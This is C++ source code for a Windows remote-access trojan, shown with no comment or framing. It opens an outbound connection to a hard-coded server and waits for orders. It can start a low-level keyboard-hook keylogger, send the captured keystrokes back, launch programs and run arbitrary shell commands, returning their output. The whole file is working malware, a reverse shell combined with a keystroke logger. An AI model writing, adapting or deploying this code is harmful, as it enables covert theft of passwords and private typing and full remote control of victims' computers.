#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <string>
#include <vector>
#include <thread>

#pragma comment(lib, "ws2_32.lib")

const std::string SERVER_IP = "255.255.255.255";
const int SERVER_PORT = 54321;

bool keylogger_active = false;
std::vector<std::string> keylog_data;

HHOOK hook;  // Correct type for SetWindowsHookEx return

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKbd = (KBDLLHOOKSTRUCT *)lParam;
        char key[5];
        if (GetKeyNameTextA(pKbd->vkCode << 16, key, sizeof(key)) > 0) {
            keylog_data.push_back(std::string(key));
        }
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);  // Use the hook handle here
}

void start_keylogger() {
    if (!keylogger_active) {
        keylogger_active = true;
        hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
        if (!hook) {
            std::cerr << "Failed to set hook!" << std::endl;
        }
    }
}

void stop_keylogger() {
    keylogger_active = false;
    UnhookWindowsHookEx(hook);
}

std::string get_keylogs() {
    std::string logs;
    for (const auto &key : keylog_data) {
        logs += key + " ";
    }
    keylog_data.clear();
    return logs;
}

void handle_command(SOCKET client, const std::string &command) {
    if (command == "start_keylogger") {
        start_keylogger();
        send(client, "Keylogger started.\n", 18, 0);
    } else if (command == "stop_keylogger") {
        stop_keylogger();
        send(client, "Keylogger stopped.\n", 18, 0);
    } else if (command == "get_keylogs") {
        std::string logs = get_keylogs();
        std::string response = "Captured Keystrokes:\n" + logs + "\n";
        send(client, response.c_str(), response.size(), 0);
    } else if (command.substr(0, 3) == "cd ") {
        std::string directory = command.substr(3);
        if (SetCurrentDirectoryA(directory.c_str())) {
            char buffer[MAX_PATH];
            GetCurrentDirectoryA(MAX_PATH, buffer);
            std::string response = "Changed directory to " + std::string(buffer) + "\n";
            send(client, response.c_str(), response.size(), 0);
        } else {
            send(client, "Failed to change directory\n", 27, 0);
        }
    } else if (command.substr(0, 7) == "launch ") {
        std::string app_name = command.substr(7);
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (CreateProcessA(app_name.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            send(client, ("Launched application: " + app_name + "\n").c_str(), app_name.size() + 20, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            send(client, ("Failed to launch application: " + app_name + "\n").c_str(), app_name.size() + 25, 0);
        }
    } else {
        char buffer[1024];
        FILE *pipe = _popen(command.c_str(), "r");
        if (pipe) {
            while (fgets(buffer, sizeof(buffer), pipe)) {
                send(client, buffer, strlen(buffer), 0);
            }
            _pclose(pipe);
        } else {
            send(client, "Command execution failed.\n", 25, 0);
        }
    }
}

void connect_to_server() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET client = socket(AF_INET, SOCK_STREAM, 0);

    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP.c_str());

    connect(client, (sockaddr *)&server_addr, sizeof(server_addr));

    char buffer[1024];
    while (true) {
        int bytesReceived = recv(client, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) break;
        buffer[bytesReceived] = '\0';
        std::string command(buffer);
        if (command == "exit") break;
        handle_command(client, command);
    }

    closesocket(client);
    WSACleanup();
}

int main() {
    connect_to_server();
    return 0;
}
